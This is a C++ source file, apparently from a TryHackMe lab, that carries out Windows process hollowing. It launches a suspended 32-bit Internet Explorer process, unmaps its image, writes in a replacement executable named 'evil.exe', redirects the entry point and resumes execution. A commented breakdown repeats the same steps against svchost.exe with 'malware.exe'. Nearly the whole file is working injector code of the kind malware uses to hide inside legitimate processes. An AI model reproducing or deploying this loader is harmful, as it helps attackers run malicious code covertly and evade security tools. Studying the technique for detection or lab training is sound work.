#include <stdio.h>
#include <Windows.h>

// From https://tryhackme.com/room/abusingwindowsinternals

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);

int main() {

        LPSTARTUPINFOA pVictimStartupInfo = new STARTUPINFOA();
        LPPROCESS_INFORMATION pVictimProcessInfo = new PROCESS_INFORMATION();

        // Tested against 32-bit IE.
        LPCSTR victimImage = "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe";

        // Change this. Also must be 32-bit. Use project settings from the same project.
        LPCSTR replacementImage = "C:\\Users\\THM-Attacker\\Desktop\\Injectors\\evil.exe";

        // Create victim process
        if (!CreateProcessA(
                        0,
                        (LPSTR)victimImage,
                        0,
                        0,
                        0,
                        CREATE_SUSPENDED,
                        0,
                        0,
                        pVictimStartupInfo,
                        pVictimProcessInfo)) {
                printf("[-] Failed to create victim process %i\r\n", GetLastError());
                return 1;
        };

        printf("[+] Created victim process\r\n");
        printf("\t[*] PID %i\r\n", pVictimProcessInfo->dwProcessId);


        // Open replacement executable to place inside victim process
        HANDLE hReplacement = CreateFileA(
                replacementImage,
                GENERIC_READ,
                FILE_SHARE_READ,
                0,
                OPEN_EXISTING,
                0,
                0
        );

        if (hReplacement == INVALID_HANDLE_VALUE) {
                printf("[-] Unable to open replacement executable %i\r\n", GetLastError());
                TerminateProcess(pVictimProcessInfo->hProcess, 1);
                return 1;
        }

        DWORD replacementSize = GetFileSize(
                hReplacement,
                0);
        printf("[+] Replacement executable opened\r\n");
        printf("\t[*] Size %i bytes\r\n", replacementSize);


        // Allocate memory for replacement executable and then load it
        PVOID pReplacementImage = VirtualAlloc(
                0,
                replacementSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE);

        DWORD totalNumberofBytesRead;

        if (!ReadFile(
                        hReplacement,
                        pReplacementImage,
                        replacementSize,
                        &totalNumberofBytesRead,
                        0)) {
                printf("[-] Unable to read the replacement executable into an image in memory %i\r\n", GetLastError());
                TerminateProcess(pVictimProcessInfo->hProcess, 1);
                return 1;
        }
        CloseHandle(hReplacement);
        printf("[+] Read replacement executable into memory\r\n");
        printf("\t[*] In current process at 0x%08x\r\n", (UINT)pReplacementImage);


        // Obtain context / register contents of victim process's primary thread
        CONTEXT victimContext;
        victimContext.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pVictimProcessInfo->hThread,
                &victimContext);
        printf("[+] Obtained context from victim process's primary thread\r\n");
        printf("\t[*] Victim PEB address / EBX = 0x%08x\r\n", (UINT)victimContext.Ebx);
        printf("\t[*] Victim entry point / EAX = 0x%08x\r\n", (UINT)victimContext.Eax);


        // Get base address of the victim executable
        PVOID pVictimImageBaseAddress;
        ReadProcessMemory(
                pVictimProcessInfo->hProcess,
                (PVOID)(victimContext.Ebx + 8),
                &pVictimImageBaseAddress,
                sizeof(PVOID),
                0);
        printf("[+] Extracted image base address of victim process\r\n");
        printf("\t[*] Address: 0x%08x\r\n", (UINT)pVictimImageBaseAddress);


        // Unmap executable image from victim process
        DWORD dwResult = NtUnmapViewOfSection(
                pVictimProcessInfo->hProcess,
                pVictimImageBaseAddress);
        if (dwResult) {
                printf("[-] Error unmapping section in victim process\r\n");
                TerminateProcess(pVictimProcessInfo->hProcess, 1);
                return 1;
        }

        printf("[+] Hollowed out victim executable via NtUnmapViewOfSection\r\n");
        printf("\t[*] Utilized base address of 0x%08x\r\n", (UINT)pVictimImageBaseAddress);


        // Allocate memory for the replacement image in the remote process
        PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pReplacementImage;
        PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew);
        DWORD replacementImageBaseAddress = pNTHeaders->OptionalHeader.ImageBase;
        DWORD sizeOfReplacementImage = pNTHeaders->OptionalHeader.SizeOfImage;

        printf("[+] Replacement image metadata extracted\r\n");
        printf("\t[*] replacementImageBaseAddress = 0x%08x\r\n", (UINT)replacementImageBaseAddress);
        printf("\t[*] Replacement process entry point = 0x%08x\r\n", (UINT)pNTHeaders->OptionalHeader.AddressOfEntryPoint);

        PVOID pVictimHollowedAllocation = VirtualAllocEx(
                pVictimProcessInfo->hProcess,
                (PVOID)pVictimImageBaseAddress,
                sizeOfReplacementImage,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
        if (!pVictimHollowedAllocation) {
                printf("[-] Unable to allocate memory in victim process %i\r\n", GetLastError());
                TerminateProcess(pVictimProcessInfo->hProcess, 1);
                return 1;
        }
        printf("[+] Allocated memory in victim process\r\n");
        printf("\t[*] pVictimHollowedAllocation = 0x%08x\r\n", (UINT)pVictimHollowedAllocation);


        // Write replacement process headers into victim process
        WriteProcessMemory(
                pVictimProcessInfo->hProcess,
                (PVOID)pVictimImageBaseAddress,
                pReplacementImage,
                pNTHeaders->OptionalHeader.SizeOfHeaders,
                0);
        printf("\t[*] Headers written into victim process\r\n");

        // Write replacement process sections into victim process
        for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
                PIMAGE_SECTION_HEADER pSectionHeader =
                        (PIMAGE_SECTION_HEADER)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)
                                + (i * sizeof(IMAGE_SECTION_HEADER)));
                WriteProcessMemory(pVictimProcessInfo->hProcess,
                        (PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader->VirtualAddress),
                        (PVOID)((LPBYTE)pReplacementImage + pSectionHeader->PointerToRawData),
                        pSectionHeader->SizeOfRawData,
                        0);
                printf("\t[*] Section %s written into victim process at 0x%08x\r\n", pSectionHeader->Name, (UINT)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
                printf("\t\t[*] Replacement section header virtual address: 0x%08x\r\n", (UINT)pSectionHeader->VirtualAddress);
                printf("\t\t[*] Replacement section header pointer to raw data: 0x%08x\r\n", (UINT)pSectionHeader->PointerToRawData);
        }


        // Set victim process entry point to replacement image's entry point - change EAX
        victimContext.Eax = (SIZE_T)((LPBYTE)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
        SetThreadContext(
                pVictimProcessInfo->hThread,
                &victimContext);
        printf("[+] Victim process entry point set to replacement image entry point in EAX register\n");
        printf("\t[*] Value is 0x%08x\r\n", (UINT)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);


        printf("[+] Resuming victim process primary thread...\n");
        ResumeThread(pVictimProcessInfo->hThread);

        printf("[+] Cleaning up\n");
        CloseHandle(pVictimProcessInfo->hThread);
        CloseHandle(pVictimProcessInfo->hProcess);
        VirtualFree(pReplacementImage, 0, MEM_RELEASE);

        return 0;
}

/** Breakdown of Sourcecode
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
        (LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
        NULL,
        NULL,
        NULL,
        TRUE, // Handles are inherited from the calling process
        CREATE_SUSPENDED, // New process is suspended
        NULL,
        NULL,
        target_si, // pointer to startup info
        target_pi) == 0) { // pointer to process information
        cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
        return 1;

HANDLE hMaliciousCode = CreateFileA(
        (LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe", // Name of image to obtain
        GENERIC_READ, // Read-only access
        FILE_SHARE_READ, // Read-only share mode
        NULL,
        OPEN_EXISTING, // Instructed to open a file or device if it exists
        NULL,
        NULL
);


DWORD maliciousFileSize = GetFileSize(
        hMaliciousCode, // Handle of malicious image
        0 // Returns no error
);

PVOID pMaliciousImage = VirtualAlloc(
        NULL,
        maliciousFileSize, // File size of malicious image
        0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
        0x04 // Enables read/write access (PAGE_READWRITE)
);


DWORD numberOfBytesRead; // Stores number of bytes read

if (!ReadFile(
        hMaliciousCode, // Handle of malicious image
        pMaliciousImage, // Allocated region of memory
        maliciousFileSize, // File size of malicious image
        &numberOfBytesRead, // Number of bytes read
        NULL
        )) {
        cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
        TerminateProcess(target_pi->hProcess, 0);
        return 1;
}

CloseHandle(hMaliciousCode);

c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
GetThreadContext(
        target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
        &c // Pointer to store retrieved context
); // Obtains the current thread context

PVOID pTargetImageBaseAddress; 
ReadProcessMemory(
        target_pi->hProcess, // Handle for the process obtained from the PROCESS_INFORMATION structure
        (PVOID)(c.Ebx + 8), // Pointer to the base address
        &pTargetImageBaseAddress, // Store target base address 
        sizeof(PVOID), // Bytes to read 
        0 // Number of bytes out
);

HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
        hNtdllBase, // Handle of ntdll
        "ZwUnmapViewOfSection" // API call to obtain
); // Obtains ZwUnmapViewOfSection from ntdll

DWORD dwResult = pZwUnmapViewOfSection(
        target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
        pTargetImageBaseAddress // Base address of the process
);

PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains the DOS header from the malicious image
PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); // Obtains the NT header from e_lfanew

DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; // Obtains the size of the optional header from the NT header structure

PVOID pHollowAddress = VirtualAllocEx(
        target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
        pTargetImageBaseAddress, // Base address of the process
        sizeOfMaliciousImage, // Byte size obtained from optional header
        0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
        0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
);

if (!WriteProcessMemory(
        target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
        pTargetImageBaseAddress, // Base address of the process
        pMaliciousImage, // Local memory where the malicious file resides
        pNTHeaders->OptionalHeader.SizeOfHeaders, // Byte size of PE headers 
        NULL
)) {
        cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
}



for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop based on number of sections in PE data
        PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header

        WriteProcessMemory(
                target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
                (PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // Base address of current section 
                (PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // Pointer for content of current section
                pSectionHeader->SizeOfRawData, // Byte size of current section
                NULL
        );
}

c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // Set the context structure pointer to the entry point from the PE optional header

SetThreadContext(
        target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
        &c // Pointer to the stored context structure
);

ResumeThread(
        target_pi->hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
);
**/
